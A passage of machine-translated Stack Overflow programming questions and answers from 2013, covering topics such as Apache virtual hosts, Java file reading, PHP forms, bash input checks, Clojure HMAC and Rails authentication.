我有一个配置有多个 NameVirtualHosts 在同一个 IP 上运行的 apache 服务器。这一切都很好。

但是，由于“include conf.d/*”指令，apache 还选择了 cacti 和 phpmyadmin 的配置，它们为 /cacti 和 /phpmyadmin 添加了别名，这些别名似乎对所有虚拟主机都有效。也就是说，我可以去`http://firstvirtualhost/cacti`and also `http://secondvirtualhost/cacti`，得到相同的页面。

在我的情况下，默认名称virtualhost 是公开可见的，我不希望像 phpmyadmin 或 cacti 这样的工具在该 URL 下可见

事实上，我不希望任何随机包能够通过在 conf.d 中为其自身创建一个文件来使其在所有虚拟主机中可见。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:45:46.740

您必须`include conf.d`从全局 Apache 配置文件中删除该行，并可选择将其添加到您自己的私有虚拟主机配置文件中。

# java - 使用 BufferedReader 每 10 行读取一次

> ID：15443747
> 
> 赞同：0
> 
> 时间：2013-03-15T23:33:50.297
> 
> 标签：java, bufferedreader

`.txt`有没有一种方法可以使用 ? 从文件中每 10 行读取一次`BufferedReader`？目前 my`BufferedReader`正在读取每一行，拆分不同的值并将它们存储在数组列表中；然后在我的程序的其他地方使用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:44:51.700

使用为此目的而设计的[LineNumberReader ：](http://docs.oracle.com/javase/6/docs/api/java/io/LineNumberReader.html)

```
LineNumberReader reader = new LineNumberReader(fileReader);
ArrayList<String> goodLines = new ArrayList<String>();
String line = null;
while ((line = reader.readLine()) != null) {
   if ((reader.getLineNumber()+1) % 10 == 0) {
       goodLines.add(line);
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:37:12.070

使用循环读取所有不需要的行，然后读取您想要的行。

```
BufferedReader br = new BufferedReader(new FileReader(file));
int index = 10;
while (lineNumber < index - 1)
    {
        lineNumber++;
        br.readLine();
    }
String lineYouWant = br.readLine();
if (lineYouWant.isEmpty()) br.close();
// Do stuff with lineYouWant
br.close(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:38:13.517

缓冲读取器的目的是使读取逻辑单元（如行）变得容易。读取多行会使您的代码复杂化，并且不会提供很大的性能提升，因为缓冲读取器已经将大块数据读取到其缓冲区中。

编辑：由于您的记录是固定大小的，您可以使用较低级别的阅读器并仅读取所需的字节数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:43:17.533

由于所有行的大小都相同，您可以查看 BufferedReader 中的[skip()](http://docs.oracle.com/javase/7/docs/api/java/io/BufferedReader.html#skip%28long%29)方法。您基本上会阅读一行，然后跳过 10 * lineSize 并阅读下一行，等等...

# php - Javascript 变量到 php 变量的转换方法工作。但我无法比较那个 php 变量

> ID：15443750
> 
> 赞同：-3
> 
> 时间：2013-03-15T23:34:03.703
> 
> 标签：php, javascript, ajax

要将 javascript 变量发送到 php 变量，我们必须使用 POST 或 Ajax。

下面的代码在不使用 POST、Get 或 Ajax 方法的情况下将 javascript 变量转换为 php 变量。
当我回显 php 变量时，它给出了正确的值，所以我假设 javascript 值被分配给 php 变量。

但是作为从服务器端处理的 php 脚本，为什么在 onClick 函数上将 js 变量分配给 php 变量？

让它成为。Js 变量现在分配给 php 变量。它正在显示适当的价值。但是为什么php变量的比较不起作用？

演示：http: [//ibence.com/jstophp.php](http://ibence.com/jstophp.php)

```
<script>
function jstophp(){

var javavar=document.getElementById("text").value;  
document.getElementById("rslt").innerHTML="<?php 

$phpvar='"+javavar+"'; 
echo 'Converted from js variable to php variable:'.$phpvar;

if($phpvar=='a'){
    echo '<br>You have typed letter a';
}

else{
    echo '<br>If you have not typed letter a, this program is working according to logic. but if you have entered letter a, why this message is displaying?';
}

?>";
}

</script> 
<body>

<div id="rslt"></div>

<input type="text" id="text" />
<button onClick="jstophp()" >Convert js to php</button>

</body> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:39:48.780

不，它没有。它不会将 PHP 变量分配给从文本字段读取的字符串。它只是为其分配一个文字值，`"+javavar+"`然后将其显示到您的 JavaScript 代码中。因此，您实际上是在显示一个名为`javavar`.

看看你的脚本在 PHP 处理后的样子：

```
<script>
function jstophp(){

var javavar=document.getElementById("text").value;  
document.getElementById("rslt").innerHTML="Converted from js variable to php variable:"+javavar+"<br>If you have not typed letter a, this program is working according to logic. but if you have entered letter a, why this message is displaying?";
}

</script> 
```

你能看到字符串是如何`"+javavar+"`嵌入到那里以创建有效的 JavaScript 代码的吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:42:20.187

您没有向服务器发送任何数据，并且在您的代码中：

```
<?php
$phpvar='"+javavar+"';  // assigning "+javavar+" to $phpvar which stays like that
if($phpvar=='a'){ // which is not true since $phpvar= "+javavar+" !
    echo '<br>You have typed letter a';
}else{
 // your message ...
}

?> 
```

# python - 基于 FK 属性的复杂 django db 排序

> ID：15443757
> 
> 赞同：0
> 
> 时间：2013-03-15T23:34:55.850
> 
> 标签：python, mysql, django

我有以下两个模型：

```
class OrderItem(models.Model):
    order = models.ForeignKey(Order, related_name='items')
    title = models.ForeignKey(Title, related_name='order_items')

class OrderNotes(models.Model):
    order_item = models.ForeignKey('OrderItem', blank=True, null=True)
    timestamp = models.DateTimeField(auto_now_add=True)
    is_active = models.BooleanField(default=True) 
```

我将如何`OrderItem`按最近`OrderNote`的活动对 s 进行排序？

在伪代码中：

```
OrderItem.objects.order_by('ordernotes_set.order_by('is_active', '-timestamp')) 
```

?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:58:33.600

我认为您可以使用注释来相当容易地处理这个问题。 [https://docs.djangoproject.com/en/dev/topics/db/aggregation/#following-relationships-backwards](https://docs.djangoproject.com/en/dev/topics/db/aggregation/#following-relationships-backwards)

```
from django.db.models import Max
OrderItems.annotate(newest_note_time=Max('ordernotes__timestamp'))
    .order_by('-ordernotes__is_active', '-newest_note_time') 
```

# php - 使用 PHP 处理 HTML 表单上的缺失数据

> ID：15443764
> 
> 赞同：0
> 
> 时间：2013-03-15T23:35:24.110
> 
> 标签：php, html, forms

我正在为此创建一个 HTML，它有很多可选的输入字段。PHP 服务器脚本获取用户输入的数据并基本上形成一个句子。

```
Hello my name is <?php echo $_POST["name"]; ?> and I am <?php echo $_POST["age"]; ?> 
```

现在，如果用户提交输入姓名和年龄的表单，则没有问题。但是，如果您省略一个或两个输入，PHP 输出会在句子中嵌入一条错误消息。我希望它通过简单地将区域留空来处理所有遗漏。

例子：

姓名：本
年龄：（空白）

你好，我的名字是本，我是。

这可以实现吗？另外，有没有办法编写一个 if/else 语句，如果用户输入了任何值，请执行此操作？

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-15T23:36:21.457

```
$name = (isset($_POST['name']) ? $_POST['name'] : '');
$age = (isset($_POST['age']) ? $_POST['age'] : '');

echo 'Hello, my name is ' . $name . ', and I am ' . $age . ' years old.'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T00:53:48.377

嗨，你应该`isset()`像 Julian H 说的那样使用，如果设置了年龄，你可以在条件下使用它来制作不同的句子

`isset()`返回 TRUE 或 FALSE

我为你做了这个（使用 _GET 但你可以使用 _POST，它更容易测试

```
<?php

$html = 'Hi, ';

if(isset($_GET['name']) AND $_GET['name'] != '')
{
    $html .= 'my name is '.strip_tags($_GET['name']).' ';
}

if(isset($_GET['name']) AND $_GET['name'] != '' AND isset($_GET['age']) AND $_GET['age'] != ''  )
{
    $html .= 'and ';
}

if(isset($_GET['age']) AND $_GET['age'] != '' )
{
    $html .= 'i am '.strip_tags($_GET['age']).' years old ';
}

echo $html; 
```

**非常重要**：我`strip_tags()`用来删除 html 标签，并避免 XXS攻击

所以最后我可以得到这些句子：

你好，我叫阿库奥

你好，我叫阿库奥，今年 23 岁

你好，我今年 23 岁

# matlab - Matlab 添加两个传递函数

> ID：15443767
> 
> 赞同：3
> 
> 时间：2013-03-15T23:35:41.323
> 
> 标签：matlab, sum, transfer-function

我正在尝试将两个传递函数添加在一起，例如：

```
tf1=tf(1,[1 0]);  
tf2=tf(2,[1 0]);  
tsum=tf1+tf2 
```

MATLAB 将 tf1 和 tf2 视为串联的块，因此将 tf1 和 tf2 相乘，结果为：

```
tsum =

3 s
---
s^2

Continuous-time transfer function. 
```

如何让 MATLAB 返回 tf1 和 tf2 的总和？所以我正在寻找的传递函数是：

```
3
-
s 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:42:58.203

```
EDU>> minreal(tsum)

ans =

  3
  -
  s

Continuous-time transfer function. 
```

看

[http://www.mathworks.com/help/control/ref/minreal.html](http://www.mathworks.com/help/control/ref/minreal.html)

# linux - 从 bash 脚本中的数字显示月份

> ID：15443768
> 
> 赞同：0
> 
> 时间：2013-03-15T23:35:46.327
> 
> 标签：linux, bash, shell, unix

我试图表明，如果您为该月键入一些内容，它会显示该月份，例如`january=1`, `february=2`, `march=3`...

和年份`2012`, `2013`, `2014`...

但是，如果您输入的内容超过`12`了该月的内容，那么它应该告诉您`"sorry"`并且我无法弄清楚如何使该消息起作用。

```
echo " please type a number for a month"
read month
echo " please type a number for a year"
read year

if [ "$month" = "1-12" ]
then
        cal "$month" "$year"
        sleep 2
        echo " thank you, good bye... "
else
        echo " sorry "  
        sleep 2
fi 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:44:00.773

```
if [[ $month -lt 13 && $month -gt 0  ]]  
then
        cal "$month" "$year"
        sleep 2
        echo " thank you, good bye... "
else
        echo " sorry "  
        sleep 2
fi 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:45:29.260

允许 cal 验证输入的完整性更安全。

```
cal $month $year 2>/dev/null
if [ $? -ne 0 ]; then
    echo sorry
fi 
```

这也将处理不是整数的输入。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-16T00:53:06.710

怎么样

```
read -r -p 'please type a number for a month: ' month
read -r -p 'please type a number for a year: ' year
cal "$month" "$year" 2&>1 1>/dev/null && \
    { cal "$month" "$year" ; echo ' thank you, good bye... ' ; } || \
    echo ' sorry ' 
```

*   read 可以提示你，不需要 echo
*   cal return status 告诉你它是否会起作用

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:43:02.123

要测试该值，只需使用逻辑和两个算术条件：

```
if (( month >= 1 )) && (( month <= 12 )) ; then
    cal $month $year
else
    echo Sorry.
fi 
```

# javascript - prompt() 函数在 UIWebView IOS 模拟器中返回 undefined

> ID：15443769
> 
> 赞同：3
> 
> 时间：2013-03-15T23:35:52.220
> 
> 标签：javascript, ios, uiwebview, undefined, prompt

```
var x=prompt('Test Me','Default');
alert(x); 
```

从 Safari 运行它 - 一切都很好。

从包装好的 UIWebView 运行它并`x`返回 undefined 无论输入是什么（按 OK 后）。

这是一个错误 - 有解决方法吗？

注意：在 6.0.1 设备和 Xcode 模拟器（版本 6.0 358.4）上测试。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:43:18.433

我刚刚尝试过，它似乎工作得很好。如果您在其他任何地方使用了变量名称，请尝试重命名您的变量。另外，如果可以，请尝试在网络浏览器中运行它，看看它是否会出现错误。干杯：D

# twitter-bootstrap - iframe 不能成为解决方案，是吗？

> ID：15443771
> 
> 赞同：0
> 
> 时间：2013-03-15T23:35:59.823
> 
> 标签：twitter-bootstrap

我正在将内容加载到 twitter 引导模式中，我遇到的问题是内容相当长，需要侧边栏。此内容是一个简单的 html 页面。它没有使用模态侧边栏，而是使用 iframe，而且在我看来，这是将外部内容导入 twitter boostraps 模态的唯一方法。

```
<p><a data-toggle="modal" class="updateNotes" href="http://adambalan.com/aisis/aisis_update/UpdateNotes/index.html" data-target="#modal">READ MORE ABOUT IT!</a></p>

    <div class="modal hide fade" id="modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 id="myModalLabel">Latest Updates!</h3>
      </div>
      <div class="modal-body">
      </div>
     <div class="modal-footer">
        <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
     </div>   
    </div> 
```

**jQuery：**

```
$('a.btn').on('click', function(e) {
    e.preventDefault();
    var url = $(this).attr('href');
    $(".modal-body").html('<iframe width="100%" height="100%" frameborder="0" scrolling="yes" allowtransparency="true" src="'+url+'"></iframe>');
}); 
```

我不需要使用 iframe 并使用模式侧边栏来滚动内容。任何想法？

我也尝试关闭 iframe 中的滚动，但内容不滚动。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:10:02.487

试过jQuery的加载功能吗？

[http://api.jquery.com/load/](http://api.jquery.com/load/)

当内容来自另一个域时，可能无法正常工作。

# database - Drupal 7 - 将站点转移到新服务器后主题信息名称错误

> ID：15443777
> 
> 赞同：1
> 
> 时间：2013-03-15T23:36:36.393
> 
> 标签：database, drupal, themes, title, transfer

将完成的站点转移到新服务器、文件/数据库等后，切换数据库设置`settings.php`并运行`update.php`后，出现以下错误：

```
Notice: Undefined index: name in block_menu() (line 146 of /home/nrsc2533/public_html/modules/block/block.module).
Notice: Undefined index: name in block_menu() (line 165 of /home/nrsc2533/public_html/modules/block/block.module).
Notice: Undefined index: name in system_menu() (line 647 of /home/nrsc2533/public_html/modules/system/system.module).
Notice: Undefined index: name in block_menu() (line 146 of /home/nrsc2533/public_html/modules/block/block.module).
Notice: Undefined index: name in block_menu() (line 165 of /home/nrsc2533/public_html/modules/block/block.module).
Notice: Undefined index: name in system_menu() (line 647 of /home/nrsc2533/public_html/modules/system/system.module). 
```

如果不是管理菜单中的所有项目，我也会丢失大部分项目。我查找了错误，它们都与以下代码行有关：

```
'title' => check_plain($theme->info['name']), 
```

这是我自定义的免费主题，它在我的服务器上的测试域上运行良好，但现在它已经转移了。我确实更改了 [theme].info 文件以反映它已在“name =”行上进行了自定义。我在网上查了一下，发现保存的时候编码可能已经改变了，再次奇怪，因为我在测试域上这样做过，看起来很好，所以我将编码更改为没有BOM的UTF-*，仍然无济于事。我尝试通过 update.php 再次清除缓存，但没有任何变化。任何帮助将不胜感激。

# umbraco - Umbraco v6 部署到生产服务器获取数据库异常、内容和媒体树未加载

> ID：15443778
> 
> 赞同：3
> 
> 时间：2013-03-15T23:36:42.377
> 
> 标签：umbraco

我们刚刚将一个新站点部署`v6`到一个运行多个站点的主机`v4`上，这没问题。在前端，它看起来不错，但在 Umbraco 管理员中，内容和媒体树看起来是空的。

在浏览器调试器中，我可以看到`TreeDataService.ashx`.

错误如下，我不确定问题是什么。是权限吗？数据库用户权限？

```
----------

You must set the singleton 'Umbraco.Core.Persistence.SqlSyntax.SyntaxConfig' to use an sql syntax provider
Parameter name: SqlSyntaxProvider
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 

Exception Details: System.ArgumentNullException: You must set the singleton 'Umbraco.Core.Persistence.SqlSyntax.SyntaxConfig' to use an sql syntax provider
Parameter name: SqlSyntaxProvider 
```

源错误：

在执行当前 Web 请求期间生成了未处理的异常。可以使用下面的异常堆栈跟踪来识别有关异常起源和位置的信息。

堆栈跟踪：

```
[ArgumentNullException: You must set the singleton 'Umbraco.Core.Persistence.SqlSyntax.SyntaxConfig' to use an sql syntax provider
Parameter name: SqlSyntaxProvider]
   Umbraco.Core.Persistence.SqlSyntax.SyntaxConfig.get_SqlSyntaxProvider() +89
   Umbraco.Core.Persistence.Mappers.BaseMapper.GetColumnName(Type dtoType, PropertyInfo dtoProperty) +57
   Umbraco.Core.Persistence.Mappers.ContentMapper.Map(String propertyName) +67
   Umbraco.Core.Persistence.Querying.ModelToSqlExpressionHelper`1.VisitMemberAccess(MemberExpression m) +112
   Umbraco.Core.Persistence.Querying.ModelToSqlExpressionHelper`1.Visit(Expression exp) +101
   Umbraco.Core.Persistence.Querying.ModelToSqlExpressionHelper`1.VisitBinary(BinaryExpression b) +258
   Umbraco.Core.Persistence.Querying.ModelToSqlExpressionHelper`1.Visit(Expression exp) +159
   Umbraco.Core.Persistence.Querying.ModelToSqlExpressionHelper`1.VisitLambda(LambdaExpression lambda) +120
   Umbraco.Core.Persistence.Querying.ModelToSqlExpressionHelper`1.Visit(Expression exp) +72
   Umbraco.Core.Persistence.Querying.Query`1.Where(Expression`1 predicate) +20
   Umbraco.Core.Services.ContentService.GetChildren(Int32 id) +312
   umbraco.cms.businesslogic.web.Document.GetChildrenForTree(Int32 NodeId) +39
   umbraco.cms.presentation.Trees.BaseContentTree.Render(XmlTree& Tree) +27
   umbraco.loadContent.Render(XmlTree& tree) +19
   umbraco.presentation.webservices.TreeDataService.LoadTree(TreeRequestParams treeParams) +79
   umbraco.presentation.webservices.TreeDataService.GetXmlTree() +140
   umbraco.presentation.webservices.TreeDataService.ProcessRequest(HttpContext context) +55
   System.Web.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() +100
   System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) +75

Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.0.30319.272 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-05-13T06:57:09.180

检查你的 umbraco db 连接字符串。

```
<add name="umbracoDbDSN"....... 
```

如果它确实包含

> providerName="System.Data.SqlClient"

然后添加并检查。相同。它可能会开始工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-29T08:26:45.947

问题是它`SqlSyntaxProvider` 是空的，我的解决方法是初始化它。

```
var service = new Umbraco.Core.Services.ContentService();
    SqlSyntaxContext.SqlSyntaxProvider = new MySqlSyntaxProvider(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-30T21:26:16.793

连接字符串，添加 name="umbracoDbDSN" ...缺少以下 providerName="System.Data.SqlClient"

一旦我将它添加到行中，事情就开始工作了。

# node.js - Express.io 的广播方法

> ID：15443779
> 
> 赞同：0
> 
> 时间：2013-03-15T23:36:44.997
> 
> 标签：node.js, express, socket.io

我有一个问题`Express.io`：我尝试创建一个聊天，但我无法使用该`Broadcast`方法。

没有错误消息，但没有任何反应。

**应用程序.js**

```
var express = require('express.io')
    , index = require('./routes/index.js')
    , http = require('http')
    , path = require('path');

var app = express();

app.configure(function(){
  //configure options
});

app.http().io();

app.get('/', index.index);

app.io.route('ready', function(req) {
    req.io.broadcast('newUser');
});

app.listen(app.get('port'), function(){
    console.log("Express server listening on port " + app.get('port'));
}); 
```

**用户.js**

```
io = io.connect();

io.emit('ready');

io.on('newUser', function(data) {
    console.log("New user !!");
}); 
```

**错误 2**

```
WebSocket connection to 'ws://tchat.aws.af.cm/socket.io/1/websocket/n8Jm9Q7YYL8YdPRN4dxU' failed: Unexpected response code: 502 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T16:46:41.850

`req.io.broadcast`向所有连接的客户端广播，除了与请求关联的客户端。您应该使用`app.io.broadcast`广播到所有连接的客户端。

请参阅给出的示例：[https ://github.com/techpines/express.io/tree/master/examples/broadcasting](https://github.com/techpines/express.io/tree/master/examples/broadcasting)

# character-encoding - Clojure SHA256 HMAC 函数未产生预期结果

> ID：15443781
> 
> 赞同：4
> 
> 时间：2013-03-15T23:36:56.940
> 
> 标签：character-encoding, clojure, javax.crypto

我有以下 Clojure 代码：

```
(ns myproject.hmac-sha256
    (:import (javax.crypto Mac)
             (javax.crypto.spec SecretKeySpec)))

(defn secretKeyInst [key mac]
    (SecretKeySpec. (.getBytes key) (.getAlgorithm mac)))

(defn toString [bytes]
    "Convert bytes to a String"
    (String. bytes "UTF-8"))

(defn sign [key string]
    "Returns the signature of a string with a given 
    key, using a SHA-256 HMAC."
    (let [mac (Mac/getInstance "HMACSHA256")
          secretKey (secretKeyInst key mac)]
          (-> (doto mac
                (.init secretKey)
                (.update (.getBytes "UTF-8")))
              .doFinal
              toString))) 
```

当我`sign`在 REPL 中使用该函数时，会输出奇怪的字形：

```
(sign "key" "The quick brown fox jumps over the lazy dog")
"*��`��n�S�F�|�؏�o�r���" 
```

而我期望`f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8`按照[https://en.wikipedia.org/wiki/Hash-based_message_authentication_code#Examples_of_HMAC_.28MD5.2C_SHA1.2C_SHA256.29](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code#Examples_of_HMAC_.28MD5.2C_SHA1.2C_SHA256.29)

这无疑是一个字符串编码问题，但我对编码知之甚少。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-16T00:14:18.310

要将输出转换为可以与示例进行比较的格式，请不要调用上面定义的 toString，而是将 .doFinal 的结果视为字节数组并以十六进制打印。上面的例子是对字符串“UTF-8”而不是输入字符串进行签名：

```
 (defn sign [key string]
  "Returns the signature of a string with a given
    key, using a SHA-256 HMAC."
  (let [mac (Mac/getInstance "HMACSHA256")
        secretKey (secretKeyInst key mac)]
    (-> (doto mac
          (.init secretKey)
          (.update (.getBytes string)))
        .doFinal)))

myproject.hmac-sha256>  (apply str (map #(format "%x" %) (sign "key" "The quick brown fox jumps over the lazy dog")))
"f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8" 
```

然后，您可以将 toString 函数编写为：

```
(defn toHexString [bytes]
  "Convert bytes to a String"
  (apply str (map #(format "%x" %) bytes))) 
```

# facebook - 操作无法完成。（com.facebook.sdk 错误 2.）错误 iOS 6

> ID：15443784
> 
> 赞同：3
> 
> 时间：2013-03-15T23:37:03.347
> 
> 标签：facebook, ios6

我一直在为我的应用程序使用 Facebook 登录流程示例，并且在之前的示例应用程序中，此登录过程有效，但现在我收到错误（com.facebook.sdk 错误 2.）。我正在使用 iOS 6 进行构建，并检查了所有 id 和 bundle 标识符是否匹配。

*示例代码*

appdelegate.m

```
 - (void)sessionStateChanged:(FBSession *)session
                      state:(FBSessionState) state
                      error:(NSError *)error
{
    switch (state) {
        case FBSessionStateOpen:
            if (!error) {
                // We have a valid session
                NSLog(@"User session found");

            }
            break;
        case FBSessionStateClosed:
        case FBSessionStateClosedLoginFailed:
            [FBSession.activeSession closeAndClearTokenInformation];
            break;
        default:
            break;

    }

    [[NSNotificationCenter defaultCenter]
     postNotificationName:FBSessionStateChangedNotification
     object:session];

    if (error) {
        UIAlertView *alertView = [[UIAlertView alloc]
                                  initWithTitle:@"Error"
                                  message:error.localizedDescription
                                  delegate:nil
                                  cancelButtonTitle:@"OK"
                                  otherButtonTitles:nil];
        NSLog(@"Login Failed");
        [alertView show];
    }
}

// Opens a Facebook session and optionally shows the login UX.

- (BOOL)openSessionWithAllowLoginUI:(BOOL)allowLoginUI {

    NSArray *permissions = [[NSArray alloc] initWithObjects:
                            @"user_events",
                            @"user_activites",
                            @"user_birthday",

                            nil];
    return [FBSession openActiveSessionWithReadPermissions:permissions
                                              allowLoginUI:allowLoginUI
                                         completionHandler:^(FBSession *session,
                                                             FBSessionState state,
                                                             NSError *error) {
                                              NSLog(@"\nfb sdk error = %@", error);
                                             [self sessionStateChanged:session
                                                                 state:state
                                                                 error:error];
                                         }];
}

/*
 * If we have a valid session at the time of openURL call, we handle
 * Facebook transitions by passing the url argument to handleOpenURL
 */

- (BOOL)application:(UIApplication *)application
            openURL:(NSURL *)url
  sourceApplication:(NSString *)sourceApplication
         annotation:(id)annotation {
    // attempt to extract a token from the url
    NSLog(@"Found FaceBook");
    return [FBSession.activeSession handleOpenURL:url];
} 
```

主控制器.m

```
- (IBAction)authButtonAction:(id)sender {
    NSLog(@"session open");
    AppDelegate *appDelegate = (AppDelegate*)
    [[UIApplication sharedApplication] delegate];

    // If the user is authenticated, log out when the button is clicked.
    // If the user is not authenticated, log in when the button is clicked.
    if (FBSession.activeSession.isOpen) {
        [appDelegate closeSession];
    } else {
        // The user has initiated a login, so call the openSession method
        // and show the login UX if necessary.
        [appDelegate openSessionWithAllowLoginUI:YES];
    }

}

- (void)sessionStateChanged:(NSNotification*)notification {
    NSLog(@"Login Activated");
    self.navigationItem.leftBarButtonItem = authButton;
    if (FBSession.activeSession.isOpen) {
        authButton = [[UIBarButtonItem alloc] init];
        authButton.title=@"Login";
    }else{
        authButton =[[UIBarButtonItem alloc]init];
        authButton.title=@"Logout";
    }

    } 
```

有任何想法吗？这是 Facebook 的错误还是我错过了什么？

# android - android 应用内计费安全非消耗品

> ID：15443794
> 
> 赞同：1
> 
> 时间：2013-03-15T23:38:02.250
> 
> 标签：android, in-app-purchase, in-app-billing, billing

Android doc 谈到了开发者有效载荷：

> 但对于非消耗品，您应该使用唯一标识用户的字符串。

如何？例如，我可以读取电话号码，但我需要额外的授权，我不想添加。或者我可以向我自己的服务器发送一个请求，用户必须先在该服务器上注册 - 但我没有服务器，对于我的应用程序来说，这将是一种矫枉过正。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T07:20:30.117

开发人员有效负载只是一个额外的字符串，您的应用只能发送和验证。您可以创建任何字符串并将其与您的请求一起发送。您将在购买响应中得到相同的字符串。开发人员指南建议为消耗性产品生成随机唯一的开发人员有效负载，您也可以对非消耗性产品执行相同操作，但如果您的应用程序有任何登录算法`loginId of user`用作开发人员有效负载并且如果您的应用程序没有登录算法声明任何字符串，我会建议您并将该字符串作为开发人员有效负载发送，但确保该字符串**不是**您（或您的公司）名称进行任何组合和使用。

# ruby - RubyGems 插件来驯服一大堆已安装的宝石？

> ID：15443798
> 
> 赞同：4
> 
> 时间：2013-03-15T23:38:17.063
> 
> 标签：ruby, rubygems

也许有人知道这种 RubyGems 插件是否已经存在，在我尝试花很多时间自己编写一个之前。

我没有使用 RVM*~~或捆绑器~~ *（编辑：请参阅评论中的线程）*，所以我安装了一大堆系统宝石。我想弄清楚哪些是我真正想要使用的 gem，哪些是我真正想使用的 gem 必须存在的依赖项，哪些只是可以清理的垃圾。

如果有人熟悉 Gentoo，我正在考虑类似于 Gentoo 的包管理的东西，但对于 RubyGems 来说——一种标记我真正*想要*保留的小宝石列表的方法，然后运行一个可以通过所有我的宝石并清理那些不依赖于这些宝石的宝石。换句话说，为 RubyGems 设置了一个“@world”。

*RVM 无论如何都不是我的选择，因为我必须使用 Microsoft Windows。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T16:44:08.663

如果你安装了graphviz，那么你可以运行它，`bundle viz`这将产生一个依赖关系的点符号映射，你可以使用它来跟踪依赖关系到你实际需要安装的那些gem（但只有那些你通过bundler安装的那些）。

```
bundle viz --format=dot 
```

# c - 如何在 x32 和 x64 中保持结构的大小不变？

> ID：15443800
> 
> 赞同：0
> 
> 时间：2013-03-15T23:38:28.580
> 
> 标签：c, memory-management, padding

所以我有一个混合数据类型的结构，如下所示，我想确保 sizeof(struct a) 是 x32 和 x64 中字长的倍数。我怎样才能做到这一点？谢谢你。

```
struct a {
    vaddr_t v1;
    size_t v2;
    unsigned short v3; 
    struct b* v4; 
    struct a *v5;
    int v6;
    pthread_mutex_t lock;
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:58:15.743

对于基本类型，如 int 或 shorts，您可以通过显式使用 int32 或 int16 而不是 int 或 short 来实现此目的。对于其他类型，如 size_t 或指针，它变得更加复杂。您最好的选择是使用类型属性（[http://gcc.gnu.org/onlinedocs/gcc-3.2/gcc/Type-Attributes.html](http://gcc.gnu.org/onlinedocs/gcc-3.2/gcc/Type-Attributes.html)）。

如果重要的是内存中的结构对齐，请对齐结构本身，而不是其成员。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T01:16:15.800

我可能在这里有点超出了我的舒适区，但是 malloc 似乎有一个变体，称为 memalign ：

```
 void *memalign(size_t alignment, size_t size);

 The memalign() function allocates size bytes on a  specified
 alignment  boundary  and  returns a pointer to the allocated
 block. The value of the returned address is guaranteed to be
 an  even  multiple of alignment. The value of alignment must
 be a power of two and must be greater than or equal  to  the
 size of a word. 
```

这可能在所有平台上都存在，也可能不存在，但这个似乎很常见：

```
int posix_memalign(void **memptr, size_t alignment, size_t size); 
```

见于：

```
http://pubs.opengroup.org/onlinepubs/009695399/functions/posix_memalign.html 
```

现在我认为固定宽度类型声明的数据类型，由 ISO/JTC1/SC22/WG14 C 提议，委员会修订当前 ISO C 标准 ISO/IEC 9899:1990 编程语言 - C 的工作草案，（我在手册页中读到）将是跨平台和跨架构稳定的。

因此，如果您查看结构成员的较低级别，那么希望它们基于诸如 int32_t 或 uint32_t 之类的整数。有 POSIX 类型，例如：

```
/*
 * POSIX Extensions
 */
typedef unsigned char   uchar_t;
typedef unsigned short  ushort_t;
typedef unsigned int    uint_t;
typedef unsigned long   ulong_t; 
```

所以我在这里想，也许可以只使用定义为这些完全跨平台稳定数据类型的类型来构造你的结构，最终结果是无论你在哪里或如何编译你的代码，结构总是相同的大小。

请记住，我在这里做一个延伸，希望其他人可以澄清并纠正我的想法。

# ruby-on-rails - 未找到 current_user 方法（Rails、Devise、Cancan）

> ID：15443804
> 
> 赞同：0
> 
> 时间：2013-03-15T23:39:01.330
> 
> 标签：ruby-on-rails, devise, cancan

我将 Rails 3.2、Devise 和 Cancan 用于具有 3 个用户类别的应用程序：公司、客户和管理员。

我的问题是我得到了这个：

```
undefined local variable or method `current_user' for #<HomeController:0xb4fd217c> 
```

在 HomeController 我有：

```
class HomeController < ApplicationController
  before_filter :authenticate_customer!
  load_and_authorize_resource :class => false

  def index
        render 'index'
    end

end 
```

此外，在视图中：

```
- content_for :title, 'Home'
= link_to('Logout', destroy_customer_session_path, :method => :delete) 
```

我没有在我的代码中的任何地方调用 current_user。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T14:19:08.563

